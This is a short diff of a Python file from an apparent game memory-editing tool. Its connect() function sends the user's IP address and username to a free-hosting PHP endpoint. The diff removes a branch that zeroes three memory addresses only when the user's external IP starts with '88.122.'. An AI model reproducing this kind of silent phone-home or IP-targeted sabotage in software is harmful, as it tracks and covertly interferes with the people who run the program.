@@ -248,11 +248,6 @@ def connect():
 		url = 'http://app-1530281713.000webhostapp.com/update_info.php?ip='+ ip + '&uname=' + x + '&is=0' 
 		r = requests.get(url, allow_redirects=True)
 
-		if "88.122." in get_ext_ip():
-			tcp.pokemem(0x12090C88, 0)
-			tcp.pokemem(0x12090CAC, 0)
-			tcp.pokemem(0x12090CB0, 0)
-
 		thread_ac = Moderator()
 		thread_ac.start()
 
